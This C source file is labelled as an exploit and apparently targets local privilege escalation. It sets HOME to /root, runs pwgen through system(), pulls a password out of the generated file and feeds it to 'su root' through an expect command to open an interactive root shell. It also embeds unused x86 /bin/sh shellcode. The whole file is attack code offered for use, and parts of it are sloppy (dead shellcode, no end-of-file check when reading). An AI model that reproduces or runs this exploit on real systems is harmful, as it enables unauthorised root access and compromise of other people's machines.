// Exploit changing env var HOME 
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#define PASSWORD 8
#define SIZE 1024

int main(void) {
    char passwordbuffer[9];
    int save_pwd;
    int i;
    int check_env;
    char pwd;
    char cmd[SIZE];
    FILE *password_file;

    //printf('env: \n', getenv("HOME") );
    
    //setenv("HOME", "/root", 1);
    check_env = setenv("HOME", "/root", 1);
    if (check_env != 0) {
        printf("cannot set env variable");
        exit(-1);
    }

    //printf('env changed successfully: ', getenv("HOME"));
    save_pwd = system("pwgen -w > password.txt");
    //save_pwd = system("pwgen -w >")
    
    // pwgen, save the pw pw.txt
    if (save_pwd == -1) {
        printf("Error saving new password to password.txt");
        exit(-2);
    }

    // open pw and pw.txt
    password_file = fopen("password.txt", "r");
    if (password_file == NULL ) {
        printf("password_file error ");
        exit(-3);
    }

    // load pw pw.txt file
    for ( pwd = fgetc( password_file ); pwd != ':'; pwd = fgetc( password_file) );

    pwd = fgetc( password_file );

    for (i = 0; i < PASSWORD; passwordbuffer[i++] = fgetc( password_file ) );
    passwordbuffer[PASSWORD] = '\0';

    sprintf(cmd, "expect -c 'spawn su root; expect \"Password:\"; send \"%s\\r\"; interact'", passwordbuffer);

    fclose(password_file);
    system(cmd);
    
    
    
}